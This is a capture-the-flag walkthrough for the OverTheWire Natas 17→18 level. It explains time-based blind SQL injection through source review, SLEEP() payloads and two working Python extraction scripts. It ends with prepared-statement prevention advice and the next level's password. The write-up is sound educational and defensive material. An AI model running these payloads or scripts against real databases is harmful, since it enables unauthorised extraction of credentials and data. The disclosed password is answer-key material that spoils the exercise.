# Natas Level 17 → 18

## Objective

Retrieve the password for the next level by exploiting a Time-Based Blind SQL Injection vulnerability.

The application checks whether a username exists in the database but never displays the query result.

The goal is to extract the password stored in the database using response time differences.

---

## Enumeration

- Reviewed the webpage functionality.
- Found a username lookup feature.
- Submitted normal usernames.
- Reviewed the source code.
- Observed that user input is directly concatenated into an SQL query.
- Identified a possible SQL Injection vulnerability.

---

# Source Code Analysis

The application receives user input:

```php
if(array_key_exists("username", $_REQUEST)) {
```

The SQL query is constructed as:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

The query is executed:

```php
$res = mysqli_query($link, $query);
```

---

## Vulnerable Code

User input is inserted directly into the SQL statement.

Example:

```php
$query = "SELECT * FROM users WHERE username=\"USER_INPUT\"";
```

If the input is:

```text
alice
```

The executed query becomes:

```sql
SELECT * FROM users
WHERE username="alice"
```

Since user-controlled data reaches the SQL query without sanitization or prepared statements, SQL Injection is possible.

---

# Vulnerability

## Blind SQL Injection

Normally, an application would display whether the query returned any rows.

However, the output is commented out.

```php
//echo "This user exists.";
//echo "This user doesn't exist.";
```

Therefore:

- No query result is visible.
- No SQL errors are displayed.
- The page always appears identical.

This makes it a Blind SQL Injection vulnerability.

---

# Confirming SQL Injection

Payload:

```text
natas18" AND SLEEP(5) #
```

The SQL query becomes:

```sql
SELECT * FROM users
WHERE username="natas18" AND SLEEP(5) #
```

If the response is delayed by approximately five seconds, SQL Injection is confirmed.

---

# Why Direct Password Retrieval Fails

Trying:

```sql
natas18" UNION SELECT password FROM users #
```

Even if the query executes successfully, the application never displays the returned rows.

Because all output statements are commented out, no password is visible.

Therefore, data must be extracted indirectly.

---

# Exploitation Strategy

Since query results cannot be viewed, ask TRUE/FALSE questions.

MySQL provides the `IF()` function.

Example:

```sql
IF(condition, SLEEP(5), 0)
```

Meaning:

```text
If the condition is TRUE:
    Wait 5 seconds

Otherwise:
    Return immediately
```

The response time becomes the communication channel.

---

## Extracting One Character

Payload:

```sql
natas18" AND IF(
SUBSTRING(password,1,1)="a",
SLEEP(5),
0
) #
```

Meaning:

```text
Is the first password character equal to 'a'?
```

---

## Case 1 - Wrong Character

Suppose the password starts with:

```text
Bxxxx...
```

Payload:

```sql
SUBSTRING(password,1,1)="a"
```

Result:

```text
FALSE
```

Execution:

```sql
IF(FALSE,SLEEP(5),0)
```

The page responds immediately.

Result:

```text
Wrong character
```

---

## Case 2 - Correct Character

Suppose the password starts with:

```text
axxxx...
```

Payload:

```sql
SUBSTRING(password,1,1)="a"
```

Result:

```text
TRUE
```

Execution:

```sql
IF(TRUE,SLEEP(5),0)
```

The server waits five seconds.

Result:

```text
Correct character found
```

---

# Automation

Testing every character manually would require thousands of requests.

Python can automate the extraction.

## Logic

```python
password = ""

for each position:

    for each character:

        ask:
        Is this character correct?

        if response is delayed:

            save character
```

---

# Exploit Script

```python
import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org"

chars = string.ascii_letters + string.digits

password = ""

for pos in range(1,33):

    for ch in chars:

        payload = (
            f'natas18" AND '
            f'IF(SUBSTRING(password,{pos},1)="'
            f'{ch}",SLEEP(3),0)#'
        )

        start = time.time()

        requests.get(
            url,
            auth=("natas17","<password>"),
            params={"username":payload}
        )

        elapsed = time.time() - start

        if elapsed > 2.5:

            password += ch

            print(password)

            break

print(password)
```

---

# Optimization

Instead of testing every possible character, Binary Search can be used with ASCII values.

Example:

```sql
ASCII(SUBSTRING(password,1,1)) > 79
```

Each request eliminates half of the remaining possibilities.

Approximate comparison:

| Method | Requests per Character |
|---------|-----------------------:|
| Linear Search | ~62 |
| Binary Search | ~6 |

This significantly reduces the total number of requests.

---

# Attack Flow

```
Open Username Lookup
        |
        v
Review Source Code
        |
        v
Find SQL Query
        |
        v
Identify SQL Injection
        |
        v
Notice Blind Output
        |
        v
Confirm Injection Using SLEEP()
        |
        v
Create TRUE/FALSE Conditions
        |
        v
Measure Response Time
        |
        v
Extract Password Characters
        |
        v
Automate Extraction
        |
        v
Retrieve Next Password
```

---

# Challenges Faced

During extraction, the recovered password was initially incorrect.

The script produced false positives because response timing can vary due to network latency.

After manually verifying the results, the comparison was changed to use the `BINARY` keyword, ensuring case-sensitive matching.

The corrected script successfully extracted the complete password.

This demonstrates the importance of verifying results instead of trusting a single timing measurement.

---

# Lessons Learned

- Blind SQL Injection does not require visible query output.
- Response timing can act as a communication channel.
- SQL functions such as `IF()`, `SLEEP()`, and `SUBSTRING()` can be abused to leak data.
- Case sensitivity matters during password extraction.
- Network latency may produce false positives.
- Verifying extracted characters is essential for reliable automation.

## Limitations

The basic script works well but has some drawbacks:

- Network latency may cause false positives.
- Case-sensitive comparisons are not enforced.
- Every character is accepted after a single delayed response.

A more reliable implementation would:

- Use `requests.Session()` to reuse the HTTP connection.
- Use `time.perf_counter()` for more precise timing.
- Use `BINARY` for exact character matching.
- Verify each character multiple times before accepting it.



# Improved Exploit Script

After developing the initial proof-of-concept, the script was improved to make password extraction more reliable.

The improvements focused on:

- More accurate timing measurements
- Case-sensitive character comparison
- Reusing HTTP connections
- Reducing false positives caused by network latency

```python
import requests
import string
import time

URL = "http://natas17.natas.labs.overthewire.org"

USERNAME = "natas17"
PASSWORD = "<LEVEL17_PASSWORD>"

session = requests.Session()
session.auth = (USERNAME, PASSWORD)

chars = string.ascii_letters + string.digits

password = ""

def check(position, ch):

    payload = (
        f'natas18" AND '
        f'IF(BINARY SUBSTRING(password,{position},1)="'
        f'{ch}",SLEEP(5),0)#'
    )

    delays = []

    for _ in range(3):

        start = time.perf_counter()

        session.get(
            URL,
            params={"username": payload},
            timeout=10
        )

        delays.append(
            time.perf_counter() - start
        )

    return sum(t > 4.5 for t in delays) >= 2


for position in range(1,33):

    for ch in chars:

        if check(position, ch):

            password += ch

            print(password)

            break

print(password)
```

---

# Script Explanation

## `requests.Session()`

```python
session = requests.Session()
```

Instead of creating a new HTTP connection for every request, a single persistent session is used.

Advantages:

- Faster execution
- Reduced connection overhead
- More consistent response times

---

## HTTP Authentication

```python
session.auth = (USERNAME, PASSWORD)
```

The challenge uses HTTP Basic Authentication.

This line automatically includes the username and password with every request, eliminating the need to specify authentication repeatedly.

---

## Character Set

```python
chars = string.ascii_letters + string.digits
```

Creates the list of characters to test.

The resulting character set contains:

- Lowercase letters (`a-z`)
- Uppercase letters (`A-Z`)
- Numbers (`0-9`)

Each character is tested until the correct one is found.

---

## Password Variable

```python
password = ""
```

Stores the extracted password.

Each successfully identified character is appended until all 32 characters have been recovered.

---

## The `check()` Function

```python
def check(position, ch):
```

This function determines whether a guessed character is correct.

It returns:

- `True` if the response indicates the character is correct.
- `False` otherwise.

Separating the verification logic into its own function makes the code easier to read and reuse.

---

## Building the SQL Injection Payload

```python
payload = (
    f'natas18" AND '
    f'IF(BINARY SUBSTRING(password,{position},1)="'
    f'{ch}",SLEEP(5),0)#'
)
```

Example payload:

```sql
natas18" AND IF(
BINARY SUBSTRING(password,5,1)="A",
SLEEP(5),
0
)#
```

Meaning:

> "Is the 5th character of the password equal to `A`?"

If the answer is TRUE:

```sql
SLEEP(5)
```

Otherwise:

```sql
0
```

The server's response time reveals whether the condition is true.

---

## Why `BINARY`?

```sql
BINARY SUBSTRING(...)
```

`BINARY` forces a case-sensitive comparison.

Without it, MySQL may compare strings using a case-insensitive collation, causing characters such as:

```text
A
```

and

```text
a
```

to be treated as equal.

Using `BINARY` ensures that only the exact character matches, preventing incorrect password extraction.

---

## Recording Multiple Timings

```python
delays = []
```

Stores the response time for each request.

Instead of trusting a single measurement, multiple measurements are collected before making a decision.

---

## Measuring Response Time

```python
start = time.perf_counter()
```

Records the start time.

After sending the request:

```python
time.perf_counter() - start
```

calculates the total response time.

`perf_counter()` provides higher precision than `time.time()` and is better suited for measuring short intervals.

---

## Sending the Request

```python
session.get(
    URL,
    params={"username": payload},
    timeout=10
)
```

Sends the SQL Injection payload to the vulnerable application.

- `params` inserts the payload into the `username` parameter.
- `timeout=10` prevents the script from waiting indefinitely if the server becomes unresponsive.

---

## Verifying the Result

```python
return sum(t > 4.5 for t in delays) >= 2
```

The script performs three requests for each character.

A character is accepted only if at least **two out of three** responses exceed **4.5 seconds**.

This reduces false positives caused by:

- Temporary network delays
- Server load
- Timing fluctuations

---

## Outer Loop

```python
for position in range(1,33):
```

Iterates through each character position of the 32-character password.

---

## Inner Loop

```python
for ch in chars:
```

Tests every possible character until the correct one is found.

---

## Saving the Character

```python
password += ch
```

When the response timing indicates a correct guess, the character is appended to the recovered password.

---

## Displaying Progress

```python
print(password)
```

Prints the partially recovered password after each successful character.

This allows the extraction process to be monitored in real time.

---

## Final Output

```python
print(password)
```

Displays the complete password after all characters have been successfully extracted.

---

# Why This Version Is Better

Compared to the initial proof-of-concept, this implementation is significantly more reliable.

Improvements include:

- Uses `requests.Session()` to reuse HTTP connections.
- Uses `time.perf_counter()` for higher timing precision.
- Uses `BINARY` to enforce case-sensitive comparisons.
- Performs multiple timing measurements before accepting a character.
- Uses a timeout to avoid hanging requests.
- Reduces false positives caused by network latency.

These improvements make the exploit more accurate and better suited for real-world Time-Based Blind SQL Injection attacks.


---

# Result

The password was successfully extracted using Time-Based Blind SQL Injection.

Although the application never displayed query results, the response delay leaked the secret one character at a time.

---

# Prevention

- Always use prepared statements.

Example:

```php
$stmt = $link->prepare(
    "SELECT * FROM users WHERE username=?"
);
$stmt->bind_param("s",$username);
```

- Never concatenate user input directly into SQL queries.
- Validate user input.
- Disable detailed database errors in production.
- Apply the principle of least privilege to database accounts.

---

# Key Takeaways

- SQL Injection occurs when user input is directly inserted into SQL queries.
- Blind SQL Injection leaks information even without visible query results.
- Time-Based Blind SQL Injection uses response delays to infer TRUE/FALSE conditions.
- Functions like `SLEEP()`, `IF()`, `SUBSTRING()`, and `ASCII()` are commonly abused during exploitation.
- Automation makes blind attacks practical.
- Prepared statements eliminate SQL Injection vulnerabilities.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas18
Password : fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
```

</details>